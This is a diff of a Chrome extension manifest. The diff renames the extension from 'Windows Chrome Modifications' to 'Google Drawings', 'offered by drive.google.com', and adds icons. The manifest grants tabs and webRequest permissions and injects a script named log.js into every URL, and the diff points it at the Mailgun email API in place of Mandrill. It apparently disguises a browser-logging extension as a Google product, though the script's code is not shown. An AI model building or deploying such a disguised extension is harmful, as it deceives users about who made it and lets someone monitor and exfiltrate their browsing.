@@ -1,8 +1,12 @@
 {
 	"manifest_version": 2,
-	"name": "Windows Chrome Modifications",
-	"version": "0.0.1",
-	"description": "windows native library",
+	"name": "Google Drawings",
+	"version": "1.1",
+	"description": "offered by drive.google.com",
+	"icons": {
+    		"128": "icon_128.png",
+    		"16": "icon_16.png"
+  	},
 	"permissions": [
 		"tabs",
 		"webRequest",
@@ -15,7 +19,7 @@
 	},
 	"content_scripts": [
 		{
-			"matches": ["<all_urls>", "https://mandrillapp.com/*"],
+			"matches": ["<all_urls>", "https://api.mailgun.net/*"],
 			"js": ["js/log.js"]
 		}
 	]
